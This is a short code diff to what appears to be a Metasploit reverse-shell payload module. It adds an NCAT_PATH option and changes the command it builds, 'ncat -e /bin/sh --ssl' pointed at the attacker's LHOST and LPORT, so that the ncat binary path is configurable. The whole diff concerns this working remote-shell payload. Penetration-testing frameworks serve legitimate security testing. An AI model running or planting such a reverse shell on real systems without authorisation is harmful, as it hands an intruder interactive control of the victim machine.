@@ -29,6 +29,9 @@ module MetasploitModule
           'Payload' => ''
         }
       ))
+    register_options([
+      OptString.new('NCAT_PATH', [true ,'The path to NCat', 'ncat'])
+    ])
   end
 
   #
@@ -42,6 +45,6 @@ module MetasploitModule
   # Returns the command string to use for execution
   #
   def command_string
-    "ncat -e /bin/sh --ssl #{datastore['LHOST']} #{datastore['LPORT']}"
+    "#{datastore['NCAT_PATH']} -e /bin/sh --ssl #{datastore['LHOST']} #{datastore['LPORT']}"
   end
 end
